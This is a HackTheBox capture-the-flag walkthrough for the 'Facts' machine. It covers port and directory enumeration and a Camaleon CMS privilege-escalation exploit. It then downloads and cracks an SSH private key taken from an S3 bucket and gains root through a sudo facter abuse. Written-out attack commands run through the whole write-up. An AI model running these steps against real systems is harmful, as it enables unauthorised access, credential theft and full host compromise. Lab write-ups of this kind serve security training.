### Facts-HackTheBox🏴󠁧󠁢󠁥󠁮󠁧󠁿

#### Recognition and Enumeration

**.First we need to prove the conexion with a ping.**
```bash
ping -c3 10.129.4.19
```

<img width="960" height="207" alt="image" src="https://github.com/user-attachments/assets/c53c3500-fba9-4de2-bc03-887548432919" />


** Now we need to search which are the open ports whith nmap.**
```bash
 nmap -p-  10.129.4.19
```

<img width="968" height="266" alt="image" src="https://github.com/user-attachments/assets/f1ea1201-9332-4531-8b8b-2371dd17bdb6" />


**We need to add to `/etc/hosts` the host of the machine.**

<img width="956" height="283" alt="image" src="https://github.com/user-attachments/assets/39e655e6-a592-47d3-9762-8f0cf278236f" />


**The website**

<img width="956" height="858" alt="image" src="https://github.com/user-attachments/assets/a48e23c7-d51c-41b3-9b73-d616bcd83daf" />


#### Exploitation

**Now we search the hidden diretory**
```bash
gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirb/common.txt -b 403,404 -t 30
```

<img width="960" height="871" alt="image" src="https://github.com/user-attachments/assets/e2130361-0caa-4c40-9695-c9c504f51b92" />


**We are going to create an account.**

<img width="964" height="994" alt="image" src="https://github.com/user-attachments/assets/058832a5-561b-49bb-a2bf-9a30af532668" />


**Camaleon CMS v2.9.0 is quite outdated, and it's vulnerable to CVE-2025–2304.**
```bash
def updated_ajax
  user_params = params.require(:user).permit!  # DANGEROUS!
  current_user.update(user_params)
end
```

<img width="964" height="209" alt="image" src="https://github.com/user-attachments/assets/618000fb-610c-43c6-a1a7-a2f68e5b1e4c" />


**With https://github.com/CsuriBird/CVE-2025-2304 we can exploit a py to be an administrator.**
```bash
 python camaleon_cms_privilege_escalation.py \
                                 --url http://facts.htb \
                                 --username adri \
                                 --password adri \
                                 --new-password adri
```

<img width="959" height="722" alt="image" src="https://github.com/user-attachments/assets/04e32bbf-e7ec-467d-971f-0a26bbebd5af" />


<img width="743" height="613" alt="image" src="https://github.com/user-attachments/assets/78a53ce0-4bc5-4511-a444-35832c92a344" />


**Now we can see the AWS s3 keys on the webside.**

<img width="960" height="565" alt="image" src="https://github.com/user-attachments/assets/e2264292-ec2f-4056-8bfe-d8640f00c3a2" />


**Let's see what folders it has inside.**
```bash
aws --endpoint-url http://10.129.4.19:54321 s3 ls
```

<img width="975" height="177" alt="image" src="https://github.com/user-attachments/assets/52efbfb1-882c-4cd2-8e89-54cc1aeb3223" />


**Now we list the contents of the public bucket and List the contents of the internal bucket**
```bash
aws --endpoint-url http://10.129.4.19:54321 s3 ls s3://randomfacts/
aws --endpoint-url http://10.129.4.19:54321 s3 ls s3://internal/
```

<img width="968" height="688" alt="image" src="https://github.com/user-attachments/assets/1d94c059-7c06-46e2-bc16-6b04aa82430e" />


**Whe are going to configure the aws with the keys.**
```bash
 aws configure
```

<img width="942" height="129" alt="image" src="https://github.com/user-attachments/assets/c880ce26-2142-49cc-b23e-be97ccf39685" />


**We are going to download the private key for this device**
```bash
aws --endpoint-url http://10.129.4.19:54321 s3 cp s3://internal/.ssh/id_ed25519 ./private.id
cat private.id 
```

<img width="965" height="333" alt="image" src="https://github.com/user-attachments/assets/ae1c50c3-faa7-4541-9286-051f4f84b2b2" />


**We will now use ssh2john to extract and convert the hash of an encrypted SSH private key.**
```bash
ssh2john private.id > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash 
```

<img width="945" height="247" alt="image" src="https://github.com/user-attachments/assets/ed461e42-791b-486e-94a4-fe259ec2b737" />


**We were able to access SSH because we already had the private key and the password, which is `dragonballz`**
```bash
ssh -i private.id trivia@facts.htb
```

<img width="954" height="512" alt="image" src="https://github.com/user-attachments/assets/71c70cc4-a3d9-4215-a313-8ce86fb37714" />

#### Escalation of Privileges

**The user flag is in William's folder**

<img width="968" height="320" alt="image" src="https://github.com/user-attachments/assets/74dd29bf-9a03-4121-a6ff-b5b335efef04" />


**To see the privileges of Trivia, we will use `sudo -l` and see which binaries it can execute in order to escalate privileges.**

<img width="968" height="150" alt="image" src="https://github.com/user-attachments/assets/4a4891ef-d376-488e-be67-09ee6ef34673" />


**https://gtfobins.org/gtfobins/facter/ To see which exploit we can run to escalate privileges, we'll go to this website and look at some of the provided files.**
```bash
echo 'exec "/bin/bash"' > root.rb
sudo /usr/bin/facter --custom-dir /home/trivia/ root
```

<img width="869" height="112" alt="image" src="https://github.com/user-attachments/assets/21842d9d-1a40-4138-90db-ae05827106a8" />


**Finally, the root flag**

<img width="967" height="192" alt="image" src="https://github.com/user-attachments/assets/99116b78-cc72-484c-b3e2-2f9b11f274fe" />

#### Finish


<img width="588" height="563" alt="image" src="https://github.com/user-attachments/assets/17c8d3a1-937d-4aae-9262-15cf91bc2d42" />
